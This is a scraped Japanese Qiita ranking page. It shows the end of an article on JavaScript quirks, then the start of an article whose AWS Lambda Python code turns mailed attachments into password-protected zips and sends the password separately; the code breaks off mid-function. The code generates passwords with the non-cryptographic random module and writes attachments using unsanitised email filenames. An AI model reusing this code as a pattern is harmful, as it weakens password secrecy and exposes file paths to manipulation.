    <span class="nx">f</span><span class="p">(</span><span class="s1">'a'</span><span class="p">);</span> <span class="c1">// -&gt; Uncaught ReferenceError: arguments is not defined</span>
</pre></div></div>

<p>アロー関数は文字数が短く、<code>this</code>をレキシカルに固定できる、これまでの<code>function</code>の短縮構文だ。<br>
ところでアロー関数は引数を<code>arguments</code>にバインドしない。<br>
かわりにスプレッド演算子で引数を受け取る必要がある。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="p">(...</span><span class="nx">args</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">args</span><span class="p">;</span>
    <span class="nx">f</span><span class="p">(</span><span class="s1">'a'</span><span class="p">);</span>
</pre></div></div>

<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions" rel="nofollow noopener" target="_blank">Arrow functions</a> at MDN.</p>

<h3>
<span id="tricky-return" class="fragment"></span><a href="#tricky-return"><i class="fa fa-link"></i></a>Tricky return</h3>

<p>区別が付くだろうか。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
      <span class="k">return</span>
      <span class="p">{</span>
        <span class="nx">b</span> <span class="o">:</span> <span class="mi">10</span>
      <span class="p">}</span>
    <span class="p">})()</span> <span class="c1">// -&gt; undefined</span>

    <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
      <span class="k">return</span> <span class="p">{</span>
        <span class="nx">b</span> <span class="o">:</span> <span class="mi">10</span>
      <span class="p">}</span>
    <span class="p">})()</span> <span class="c1">// -&gt; { b: 10 }</span>
</pre></div></div>

<p>これは自動セミコロン挿入機能によるものである。<br>
改行の後には、大抵セミコロンが自動的に挿入されてしまう。<br>
前者の例ではreturnと<code>{</code>の間にセミコロンが入り、関数はundefinedを返し、オブジェクトリテラルが評価されることはない。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-rules-of-automatic-semicolon-insertion" rel="nofollow noopener" target="_blank">11.9.1 Rules of Automatic Semicolon Insertion</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-return-statement" rel="nofollow noopener" target="_blank">13.10 The return Statement</a></p>

<h3>
<span id="accessing-object-properties-with-arrays" class="fragment"></span><a href="#accessing-object-properties-with-arrays"><i class="fa fa-link"></i></a>Accessing object properties with arrays</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">property</span><span class="o">:</span> <span class="mi">1</span> <span class="p">}</span>
    <span class="kd">var</span> <span class="nx">array</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'property'</span><span class="p">]</span>

    <span class="nx">obj</span><span class="p">[</span><span class="nx">array</span><span class="p">]</span> <span class="c1">// -&gt; 1</span>
</pre></div></div>

<p>多次元配列にしたらどうなる？</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">var</span> <span class="nx">map</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="kd">var</span> <span class="nx">z</span> <span class="o">=</span> <span class="mi">3</span>

    <span class="nx">map</span><span class="p">[[</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="p">]]</span> <span class="o">=</span> <span class="kc">true</span>
    <span class="nx">map</span><span class="p">[[</span><span class="nx">x</span> <span class="o">+</span> <span class="mi">10</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="p">]]</span> <span class="o">=</span> <span class="kc">true</span>

    <span class="nx">map</span><span class="p">[</span><span class="s2">"1,2,3"</span><span class="p">]</span>  <span class="c1">// -&gt; true</span>
    <span class="nx">map</span><span class="p">[</span><span class="s2">"11,2,3"</span><span class="p">]</span> <span class="c1">// -&gt; true</span>
</pre></div></div>

<p>ブラケット記法<code>[]</code>は、渡された値をtoStringに通す。<br>
配列に要素がひとつしかない場合、その結果は要素だけをtoStringしたのと同じ結果になる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">[</span><span class="s1">'property'</span><span class="p">].</span><span class="nx">toString</span><span class="p">()</span> <span class="c1">// -&gt; 'property'</span>
</pre></div></div>

<h3>
<span id="null-and-relational-operators" class="fragment"></span><a href="#null-and-relational-operators"><i class="fa fa-link"></i></a>Null and Relational Operators</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kc">null</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// false</span>
    <span class="kc">null</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// false</span>

    <span class="kc">null</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// true</span>
</pre></div></div>

<p>簡単にまとめると、『もし<code>null&lt;0</code>が<code>false</code>であれば、<code>null&gt;=0</code>は<code>true</code>である』<br>
詳しい説明は<a href="https://blog.campvanilla.com/javascript-the-curious-case-of-null-0-7b131644e274" rel="nofollow noopener" target="_blank">ここ</a>にある。</p>

<h3>
<span id="numbertofixed-display-different-numbers" class="fragment"></span><a href="#numbertofixed-display-different-numbers"><i class="fa fa-link"></i></a>Number.toFixed() display different numbers</h3>

<p>Number.toFixedはブラウザによって異なる結果になる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span><span class="mf">0.7875</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> 
    <span class="c1">// FireFox: -&gt; 0.787</span>
    <span class="c1">// Chrome: -&gt; 0.787</span>
    <span class="c1">// IE11: -&gt; 0.788</span>
<span class="mf">0.7876</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="c1">// FireFox: -&gt; 0.788</span>
    <span class="c1">// Chrome: -&gt; 0.788</span>
    <span class="c1">// IE11: -&gt; 0.788</span>
</pre></div></div>

<p><a href="https://www.ecma-international.org/ecma-262//#sec-number.prototype.tofixed" rel="nofollow noopener" target="_blank">20.1.3.3 Number.prototype.toFixed (fractionDigits)</a></p>

<h2>
<span id="other-resources" class="fragment"></span><a href="#other-resources"><i class="fa fa-link"></i></a>Other resources</h2>

<h3>
<span id="wtfjscom" class="fragment"></span><a href="#wtfjscom"><i class="fa fa-link"></i></a><a href="http://wtfjs.com/" rel="nofollow noopener" target="_blank">wtfjs.com</a>
</h3>

<p>その不規則で矛盾に満ちていて直感的でないWeb言語について。</p>

<h3>
<span id="wat" class="fragment"></span><a href="#wat"><i class="fa fa-link"></i></a><a href="https://www.destroyallsoftware.com/talks/wat" rel="nofollow noopener" target="_blank">Wat</a>
</h3>

<p>Gary Bernhardtが2012年のCodeMashで発表したライトニングトーク。</p>

<h3>
<span id="what-the-javascript" class="fragment"></span><a href="#what-the-javascript"><i class="fa fa-link"></i></a><a href="https://www.youtube.com/watch?v=2pL28CcEijU" rel="nofollow noopener" target="_blank">What the... JavaScript?</a>
</h3>

<p>Kyle SimpsonsによるJavaScriptの素敵な仕様についてのトーク。<br>
彼は、クリーンでエレガントで可読性の高いコードを作成し、オープンソースコミュニティに貢献できるよう人々を導きたいと考えている。</p>

<h2>
<span id="license" class="fragment"></span><a href="#license"><i class="fa fa-link"></i></a>License</h2>

<p><a href="http://www.wtfpl.net/" rel="nofollow noopener" target="_blank">WTFPL 2.0</a>ライセンスだ。</p>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>

<p>知らない仕様や、意味のわからない動作がたくさんあった。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">36位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>265</kbd>
		<a target="_blank" href="https://qiita.com/Kta-M/items/afa94a6728416511b78b">メールにパスワード付きzipを添付して「パスワードは別途お送りいたします」とする慣習がめんどくさいのでなんとかした</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-19<br />20:34:35</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/39565.html">Kta-M</a>(40件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/39565/profile-images/1473688153">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[AWS]</b> <b>[mail]</b> <b>[amazonses]</b> <b>[serverless]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="あの慣習" class="fragment"></span><a href="#%E3%81%82%E3%81%AE%E6%85%A3%E7%BF%92"><i class="fa fa-link"></i></a>あの慣習</h2>

<p>メールにパスワード付きzipを添付して「パスワードは別途お送りいたします」とする慣習、ありますよね。<br>
自分からはやらないけど、相手に合わせてやらざるを得なかったりしてめんどくさい。</p>

<p>ここでは、このやり方の是非は問題にしません。<br>
どんなに是非を説いても、この慣習があるという状況は変わらないので。</p>

<p>そして、この慣習を無くすことも考えません。<br>
そういうのは巨大な力を持った何かにおまかせします。</p>

<p>昔のエラい人は言いました。「長いものには巻かれろ」と。<br>
ただし、巻かれ方は考えたほうがいいと思うのです。</p>

<h2>
<span id="スマートな巻かれ方を考える" class="fragment"></span><a href="#%E3%82%B9%E3%83%9E%E3%83%BC%E3%83%88%E3%81%AA%E5%B7%BB%E3%81%8B%E3%82%8C%E6%96%B9%E3%82%92%E8%80%83%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>スマートな巻かれ方を考える</h2>

<p>巻かれるにあたって、解決したいことはただ一つ。めんどくさくないこと。<br>
このためにWebシステム作って、ブラウザ開いてどうのこうのなんてやってると本末転倒です。<br>
可能な限り、普通のメール送信に近い形で実現したい。</p>

<p>というわけで、あれこれ考えた末、一部の制約を許容しつつ、AmazonSESを使ってサーバーレスな感じで解決してみました。</p>

<h3>
<span id="仕様" class="fragment"></span><a href="#%E4%BB%95%E6%A7%98"><i class="fa fa-link"></i></a>仕様</h3>

<ol>
<li>普通にメールを書く(新規・返信・転送問わず)</li>
<li>ファイルをzipで固めずにそのまま放り込む</li>
<li>SES宛のメールアドレスを<code>To</code>に、実際にファイルを送りたい相手を<code>Reply-To</code>に設定する。</li>
<li>システムを信じて送信ボタンを押す</li>
<li>自分と相手に、パスワード付きzipが添付されたメールとパスワードのお知らせメールが届く</li>
</ol>

<p>ただし、以下の制約があります。個人的には許容範囲です。</p>

<ul>
<li>結果的に相手方には全員<code>To</code>で届く。<code>Cc</code>はできない(自分は<code>Bcc</code>)</li>
<li>zipファイルの名前は日時(yymmddHHMMSS.zip)になる(中身のファイル名はそのまま)</li>
</ul>

<h2>
<span id="システム構成" class="fragment"></span><a href="#%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E6%A7%8B%E6%88%90"><i class="fa fa-link"></i></a>システム構成</h2>

<p><a href="https://camo.qiitausercontent.com/31166a1e0abd2cb973a51ee20e7dc3d7cc3a5671/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f61353132323738642d623830372d646135612d353431622d6536613637623934386239322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/31166a1e0abd2cb973a51ee20e7dc3d7cc3a5671/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33393536352f61353132323738642d623830372d646135612d353431622d6536613637623934386239322e706e67" alt="flow_01.png" title="flow_01.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/39565/a512278d-b807-da5a-541b-e6a67b948b92.png"></a></p>

<ol>
<li>SESに宛ててメールを送る</li>
<li>メールデータがS3に保存される</li>
<li>それをトリガーにしてLambdaが起動する</li>
<li>Lambdaがメールの内容を解析してパスワードとzipファイルを生成する</li>
<li>いい感じにメールを送る（念のため自分にもBccで送る）</li>
</ol>

<h2>
<span id="実装" class="fragment"></span><a href="#%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>実装</h2>

<h3>
<span id="lambda" class="fragment"></span><a href="#lambda"><i class="fa fa-link"></i></a>Lambda</h3>

<p>真面目にpython書いたの初めてだけどこんな感じでいいのかな？<br>
大体メールと文字コードとファイルとの戦いです。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
<span class="kn">import</span> <span class="nn">boto3</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">smtplib</span>
<span class="kn">import</span> <span class="nn">email</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">email</span>                <span class="kn">import</span> <span class="n">encoders</span>
<span class="kn">from</span> <span class="nn">email.header</span>         <span class="kn">import</span> <span class="n">decode_header</span>
<span class="kn">from</span> <span class="nn">email.mime.base</span>      <span class="kn">import</span> <span class="n">MIMEBase</span>
<span class="kn">from</span> <span class="nn">email.mime.multipart</span> <span class="kn">import</span> <span class="n">MIMEMultipart</span>
<span class="kn">from</span> <span class="nn">email.mime.text</span>      <span class="kn">import</span> <span class="n">MIMEText</span>
<span class="kn">from</span> <span class="nn">email.mime.image</span>     <span class="kn">import</span> <span class="n">MIMEImage</span>
<span class="kn">from</span> <span class="nn">datetime</span>             <span class="kn">import</span> <span class="n">datetime</span>

<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)),</span> <span class="s1">'vendored'</span><span class="p">))</span>
<span class="kn">import</span> <span class="nn">pyminizip</span>

<span class="n">s3</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s1">'s3'</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">MailParser</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="sd">"""</span>
<span class="sd">    メール解析クラス</span>
<span class="sd">    (参考) http://qiita.com/sayamada/items/a42d344fa343cd80cf86</span>
<span class="sd">    """</span>

    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">email_string</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        初期化</span>
<span class="sd">        """</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">email_message</span>    <span class="o">=</span> <span class="n">email</span><span class="o">.</span><span class="n">message_from_string</span><span class="p">(</span><span class="n">email_string</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">subject</span>          <span class="o">=</span> <span class="bp">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">from_address</span>     <span class="o">=</span> <span class="bp">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">reply_to_address</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">body</span>             <span class="o">=</span> <span class="s2">""</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">attach_file_list</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="c1"># emlの解釈</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_parse</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">get_attr_data</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        メールデータの取得</span>
<span class="sd">        """</span>
        <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s2">"from"</span><span class="p">:</span>         <span class="bp">self</span><span class="o">.</span><span class="n">from_address</span><span class="p">,</span>
                <span class="s2">"reply_to"</span><span class="p">:</span>     <span class="bp">self</span><span class="o">.</span><span class="n">reply_to_address</span><span class="p">,</span>
                <span class="s2">"subject"</span><span class="p">:</span>      <span class="bp">self</span><span class="o">.</span><span class="n">subject</span><span class="p">,</span>
                <span class="s2">"body"</span><span class="p">:</span>         <span class="bp">self</span><span class="o">.</span><span class="n">body</span><span class="p">,</span>
                <span class="s2">"attach_files"</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">attach_file_list</span>
                <span class="p">}</span>
        <span class="k">return</span> <span class="n">attr</span>


    <span class="k">def</span> <span class="nf">_parse</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        メールファイルの解析</span>
<span class="sd">        """</span>

        <span class="c1"># メッセージヘッダ部分の解析</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">subject</span>          <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_decoded_header</span><span class="p">(</span><span class="s2">"Subject"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">from_address</span>     <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_decoded_header</span><span class="p">(</span><span class="s2">"From"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">reply_to_address</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_decoded_header</span><span class="p">(</span><span class="s2">"Reply-To"</span><span class="p">)</span>

        <span class="c1"># メールアドレスの文字列だけ抽出する</span>
        <span class="n">from_list</span> <span class="o">=</span>  <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">"&lt;(.*@.*)&gt;"</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">from_address</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">from_list</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">from_address</span> <span class="o">=</span> <span class="n">from_list</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">reply_to_list</span> <span class="o">=</span>  <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">"&lt;(.*@.*)&gt;"</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">reply_to_address</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">reply_to_list</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">reply_to_address</span> <span class="o">=</span> <span class="s1">','</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">reply_to_list</span><span class="p">)</span>

        <span class="c1"># メッセージ本文部分の解析</span>
        <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">email_message</span><span class="o">.</span><span class="n">walk</span><span class="p">():</span>
            <span class="c1"># ContentTypeがmultipartの場合は実際のコンテンツはさらに</span>
            <span class="c1"># 中のpartにあるので読み飛ばす</span>
            <span class="k">if</span> <span class="n">part</span><span class="o">.</span><span class="n">get_content_maintype</span><span class="p">()</span> <span class="o">==</span> <span class="s1">'multipart'</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="c1"># ファイル名の取得</span>
            <span class="n">attach_fname</span> <span class="o">=</span> <span class="n">part</span><span class="o">.</span><span class="n">get_filename</span><span class="p">()</span>
            <span class="c1"># ファイル名がない場合は本文のはず</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">attach_fname</span><span class="p">:</span>
                <span class="n">charset</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">part</span><span class="o">.</span><span class="n">get_content_charset</span><span class="p">())</span>
                <span class="k">if</span> <span class="n">charset</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
                    <span class="k">if</span> <span class="n">charset</span> <span class="o">==</span> <span class="s1">'utf-8'</span><span class="p">:</span>
                        <span class="bp">self</span><span class="o">.</span><span class="n">body</span> <span class="o">+=</span> <span class="n">part</span><span class="o">.</span><span class="n">get_payload</span><span class="p">()</span>
                    <span class="k">else</span><span class="p">:</span>
                        <span class="bp">self</span><span class="o">.</span><span class="n">body</span> <span class="o">+=</span> <span class="n">part</span><span class="o">.</span><span class="n">get_payload</span><span class="p">(</span><span class="n">decode</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">charset</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">"replace"</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">body</span> <span class="o">+=</span> <span class="n">part</span><span class="o">.</span><span class="n">get_payload</span><span class="p">(</span><span class="n">decode</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="c1"># ファイル名があるならそれは添付ファイルなので</span>
                <span class="c1"># データを取得する</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">attach_file_list</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                    <span class="s2">"name"</span><span class="p">:</span> <span class="n">attach_fname</span><span class="p">,</span>
                    <span class="s2">"data"</span><span class="p">:</span> <span class="n">part</span><span class="o">.</span><span class="n">get_payload</span><span class="p">(</span><span class="n">decode</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                <span class="p">})</span>

    <span class="k">def</span> <span class="nf">_get_decoded_header</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key_name</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        ヘッダーオブジェクトからデコード済の結果を取得する</span>
<span class="sd">        """</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="s2">""</span>

        <span class="c1"># 該当項目がないkeyは空文字を戻す</span>
        <span class="n">raw_obj</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">email_message</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">key_name</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">raw_obj</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">return</span> <span class="s2">""</span>
        <span class="c1"># デコードした結果をunicodeにする</span>
        <span class="k">for</span> <span class="n">fragment</span><span class="p">,</span> <span class="n">encoding</span> <span class="ow">in</span> <span class="n">decode_header</span><span class="p">(</span><span class="n">raw_obj</span><span class="p">):</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">fragment</span><span class="p">,</span> <span class="s2">"decode"</span><span class="p">):</span>
                <span class="n">ret</span> <span class="o">+=</span> <span class="n">fragment</span>
                <span class="k">continue</span>
            <span class="c1"># encodeがなければとりあえずUTF-8でデコードする</span>
            <span class="k">if</span> <span class="n">encoding</span><span class="p">:</span>
                <span class="n">ret</span> <span class="o">+=</span> <span class="n">fragment</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">encoding</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">ret</span> <span class="o">+=</span> <span class="n">fragment</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"UTF-8"</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">ret</span>

<span class="k">class</span> <span class="nc">MailForwarder</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>

    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">email_attr</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        初期化</span>
<span class="sd">        """</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">email_attr</span> <span class="o">=</span> <span class="n">email_attr</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">encode</span>     <span class="o">=</span> <span class="s1">'utf-8'</span>

    <span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        添付ファイルにパスワード付き圧縮を行い転送、さらにパスワード通知メールを送信</span>
<span class="sd">        """</span>

        <span class="c1"># パスワード生成</span>
        <span class="n">password</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_generate_password</span><span class="p">()</span>

        <span class="c1"># zipデータ生成</span>
        <span class="n">zip_name</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">'%Y%m</span><span class="si">%d</span><span class="s1">%H%M%S'</span><span class="p">)</span>
        <span class="n">zip_data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_generate_zip</span><span class="p">(</span><span class="n">zip_name</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>

        <span class="c1"># zipデータを送信</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_forward_with_zip</span><span class="p">(</span><span class="n">zip_name</span><span class="p">,</span> <span class="n">zip_data</span><span class="p">)</span>

        <span class="c1"># パスワードを送信</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_send_password</span><span class="p">(</span><span class="n">zip_name</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">_generate_password</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        パスワード生成</span>
<span class="sd">        記号、英字、数字からそれぞれ4文字ずつ取ってシャッフル</span>
<span class="sd">        """</span>
        <span class="n">password_chars</span> <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="o">+</span> \
                         <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="o">+</span> \
                         <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>

        <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">password_chars</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">password_chars</span><span class="p">)))</span>

    <span class="k">def</span> <span class="nf">_generate_zip</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">zip_name</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        パスワード付きZipファイルのデータを生成</span>
<span class="sd">        """</span>
        <span class="n">tmp_dir</span>  <span class="o">=</span> <span class="s2">"/tmp/"</span> <span class="o">+</span> <span class="n">zip_name</span>
        <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">tmp_dir</span><span class="p">)</span>

        <span class="c1"># 一旦ローカルにファイルを保存</span>
        <span class="k">for</span> <span class="n">attach_file</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">email_attr</span><span class="p">[</span><span class="s1">'attach_files'</span><span class="p">]:</span>
            <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">tmp_dir</span> <span class="o">+</span> <span class="s2">"/"</span> <span class="o">+</span> <span class="n">attach_file</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="s1">'wb'</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">attach_file</span><span class="p">[</span><span class="s1">'data'</span><span class="p">])</span>
            <span class="n">f</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
            <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

        <span class="c1"># パスワード付きzipに</span>
        <span class="n">dst_file_path</span> <span class="o">=</span> <span class="s2">"/tmp/</span><span class="si">%s</span><span class="s2">.zip"</span> <span class="o">%</span> <span class="n">zip_name</span>
